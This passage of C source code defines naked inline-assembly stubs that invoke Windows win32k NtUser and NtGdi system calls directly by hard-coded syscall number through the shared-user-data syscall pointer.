        mov eax, 000011DCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserProcessConnect()
{
    __asm {
        mov eax, 000011DDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryInformationThread()
{
    __asm {
        mov eax, 000011DEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryInputContext()
{
    __asm {
        mov eax, 000011DFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserQuerySendMessage()
{
    __asm {
        mov eax, 000011E0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserQueryWindow()
{
    __asm {
        mov eax, 000011E1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserRealChildWindowFromPoint()
{
    __asm {
        mov eax, 000011E2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRealInternalGetMessage()
{
    __asm {
        mov eax, 000011E3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserRealWaitMessageEx()
{
    __asm {
        mov eax, 000011E4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserRedrawWindow()
{
    __asm {
        mov eax, 000011E5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterClassExWOW()
{
    __asm {
        mov eax, 000011E6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterUserApiHook()
{
    __asm {
        mov eax, 000011E7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterHotKey()
{
    __asm {
        mov eax, 000011E8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterRawInputDevices()
{
    __asm {
        mov eax, 000011E9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterTasklist()
{
    __asm {
        mov eax, 000011EAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserRegisterWindowMessage()
{
    __asm {
        mov eax, 000011EBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoveMenu()
{
    __asm {
        mov eax, 000011ECh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoveProp()
{
    __asm {
        mov eax, 000011EDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserResolveDesktop()
{
    __asm {
        mov eax, 000011EEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserResolveDesktopForWOW()
{
    __asm {
        mov eax, 000011EFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSBGetParms()
{
    __asm {
        mov eax, 000011F0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserScrollDC()
{
    __asm {
        mov eax, 000011F1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserScrollWindowEx()
{
    __asm {
        mov eax, 000011F2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserSelectPalette()
{
    __asm {
        mov eax, 000011F3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSendInput()
{
    __asm {
        mov eax, 000011F4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetActiveWindow()
{
    __asm {
        mov eax, 000011F5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetAppImeLevel()
{
    __asm {
        mov eax, 000011F6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCapture()
{
    __asm {
        mov eax, 000011F7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClassLong()
{
    __asm {
        mov eax, 000011F8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClassWord()
{
    __asm {
        mov eax, 000011F9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClipboardData()
{
    __asm {
        mov eax, 000011FAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetClipboardViewer()
{
    __asm {
        mov eax, 000011FBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetConsoleReserveKeys()
{
    __asm {
        mov eax, 000011FCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursor()
{
    __asm {
        mov eax, 000011FDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursorContents()
{
    __asm {
        mov eax, 000011FEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetCursorIconData()
{
    __asm {
        mov eax, 000011FFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetFocus()
{
    __asm {
        mov eax, 00001200h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeHotKey()
{
    __asm {
        mov eax, 00001201h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeInfoEx()
{
    __asm {
        mov eax, 00001202h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetImeOwnerWindow()
{
    __asm {
        mov eax, 00001203h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInformationProcess()
{
    __asm {
        mov eax, 00001204h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInformationThread()
{
    __asm {
        mov eax, 00001205h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetInternalWindowPos()
{
    __asm {
        mov eax, 00001206h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetKeyboardState()
{
    __asm {
        mov eax, 00001207h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetLogonNotifyWindow()
{
    __asm {
        mov eax, 00001208h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenu()
{
    __asm {
        mov eax, 00001209h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuContextHelpId()
{
    __asm {
        mov eax, 0000120Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuDefaultItem()
{
    __asm {
        mov eax, 0000120Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetMenuFlagRtoL()
{
    __asm {
        mov eax, 0000120Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetObjectInformation()
{
    __asm {
        mov eax, 0000120Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetParent()
{
    __asm {
        mov eax, 0000120Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetProcessWindowStation()
{
    __asm {
        mov eax, 0000120Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetProp()
{
    __asm {
        mov eax, 00001210h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetScrollInfo()
{
    __asm {
        mov eax, 00001211h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetShellWindowEx()
{
    __asm {
        mov eax, 00001212h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSysColors()
{
    __asm {
        mov eax, 00001213h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemCursor()
{
    __asm {
        mov eax, 00001214h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemMenu()
{
    __asm {
        mov eax, 00001215h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetSystemTimer()
{
    __asm {
        mov eax, 00001216h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadDesktop()
{
    __asm {
        mov eax, 00001217h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadLayoutHandles()
{
    __asm {
        mov eax, 00001218h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetThreadState()
{
    __asm {
        mov eax, 00001219h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetTimer()
{
    __asm {
        mov eax, 0000121Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowFNID()
{
    __asm {
        mov eax, 0000121Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowLong()
{
    __asm {
        mov eax, 0000121Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowPlacement()
{
    __asm {
        mov eax, 0000121Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowPos()
{
    __asm {
        mov eax, 0000121Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowRgn()
{
    __asm {
        mov eax, 0000121Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowsHookAW()
{
    __asm {
        mov eax, 00001220h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowsHookEx()
{
    __asm {
        mov eax, 00001221h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowStationUser()
{
    __asm {
        mov eax, 00001222h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWindowWord()
{
    __asm {
        mov eax, 00001223h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserSetWinEventHook()
{
    __asm {
        mov eax, 00001224h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowCaret()
{
    __asm {
        mov eax, 00001225h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowScrollBar()
{
    __asm {
        mov eax, 00001226h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserShowWindow()
{
    __asm {
        mov eax, 00001227h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserShowWindowAsync()
{
    __asm {
        mov eax, 00001228h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSoundSentry()
{
    __asm {
        mov eax, 00001229h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserSwitchDesktop()
{
    __asm {
        mov eax, 0000122Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserSystemParametersInfo()
{
    __asm {
        mov eax, 0000122Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserTestForInteractiveUser()
{
    __asm {
        mov eax, 0000122Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserThunkedMenuInfo()
{
    __asm {
        mov eax, 0000122Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserThunkedMenuItemInfo()
{
    __asm {
        mov eax, 0000122Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserToUnicodeEx()
{
    __asm {
        mov eax, 0000122Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserTrackMouseEvent()
{
    __asm {
        mov eax, 00001230h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserTrackPopupMenuEx()
{
    __asm {
        mov eax, 00001231h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserCalcMenuBar()
{
    __asm {
        mov eax, 00001232h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserPaintMenuBar()
{
    __asm {
        mov eax, 00001233h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserTranslateAccelerator()
{
    __asm {
        mov eax, 00001234h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserTranslateMessage()
{
    __asm {
        mov eax, 00001235h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnhookWindowsHookEx()
{
    __asm {
        mov eax, 00001236h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnhookWinEvent()
{
    __asm {
        mov eax, 00001237h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnloadKeyboardLayout()
{
    __asm {
        mov eax, 00001238h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnlockWindowStation()
{
    __asm {
        mov eax, 00001239h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterClass()
{
    __asm {
        mov eax, 0000123Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterUserApiHook()
{
    __asm {
        mov eax, 0000123Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserUnregisterHotKey()
{
    __asm {
        mov eax, 0000123Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateInputContext()
{
    __asm {
        mov eax, 0000123Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateInstance()
{
    __asm {
        mov eax, 0000123Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdateLayeredWindow()
{
    __asm {
        mov eax, 0000123Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetLayeredWindowAttributes()
{
    __asm {
        mov eax, 00001240h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetLayeredWindowAttributes()
{
    __asm {
        mov eax, 00001241h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserUpdatePerUserSystemParameters()
{
    __asm {
        mov eax, 00001242h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserUserHandleGrantAccess()
{
    __asm {
        mov eax, 00001243h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateHandleSecure()
{
    __asm {
        mov eax, 00001244h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateRect()
{
    __asm {
        mov eax, 00001245h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserValidateTimerCallback()
{
    __asm {
        mov eax, 00001246h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserVkKeyScanEx()
{
    __asm {
        mov eax, 00001247h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitForInputIdle()
{
    __asm {
        mov eax, 00001248h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitForMsgAndEvent()
{
    __asm {
        mov eax, 00001249h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserWaitMessage()
{
    __asm {
        mov eax, 0000124Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserWin32PoolAllocationStats()
{
    __asm {
        mov eax, 0000124Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserWindowFromPoint()
{
    __asm {
        mov eax, 0000124Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserYieldTask()
{
    __asm {
        mov eax, 0000124Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteConnect()
{
    __asm {
        mov eax, 0000124Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteRedrawRectangle()
{
    __asm {
        mov eax, 0000124Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteRedrawScreen()
{
    __asm {
        mov eax, 00001250h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserRemoteStopScreenUpdates()
{
    __asm {
        mov eax, 00001251h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCtxDisplayIOCtl()
{
    __asm {
        mov eax, 00001252h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngAssociateSurface()
{
    __asm {
        mov eax, 00001253h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateBitmap()
{
    __asm {
        mov eax, 00001254h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateDeviceSurface()
{
    __asm {
        mov eax, 00001255h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateDeviceBitmap()
{
    __asm {
        mov eax, 00001256h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreatePalette()
{
    __asm {
        mov eax, 00001257h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngComputeGlyphSet()
{
    __asm {
        mov eax, 00001258h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCopyBits()
{
    __asm {
        mov eax, 00001259h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeletePalette()
{
    __asm {
        mov eax, 0000125Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeleteSurface()
{
    __asm {
        mov eax, 0000125Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngEraseSurface()
{
    __asm {
        mov eax, 0000125Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngUnlockSurface()
{
    __asm {
        mov eax, 0000125Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngLockSurface()
{
    __asm {
        mov eax, 0000125Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngBitBlt()
{
    __asm {
        mov eax, 0000125Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStretchBlt()
{
    __asm {
        mov eax, 00001260h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngPlgBlt()
{
    __asm {
        mov eax, 00001261h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngMarkBandingSurface()
{
    __asm {
        mov eax, 00001262h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStrokePath()
{
    __asm {
        mov eax, 00001263h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngFillPath()
{
    __asm {
        mov eax, 00001264h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStrokeAndFillPath()
{
    __asm {
        mov eax, 00001265h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngPaint()
{
    __asm {
        mov eax, 00001266h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngLineTo()
{
    __asm {
        mov eax, 00001267h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngAlphaBlend()
{
    __asm {
        mov eax, 00001268h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngGradientFill()
{
    __asm {
        mov eax, 00001269h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngTransparentBlt()
{
    __asm {
        mov eax, 0000126Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngTextOut()
{
    __asm {
        mov eax, 0000126Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngStretchBltROP()
{
    __asm {
        mov eax, 0000126Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000034h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_cGetPalette()
{
    __asm {
        mov eax, 0000126Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_iXlate()
{
    __asm {
        mov eax, 0000126Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

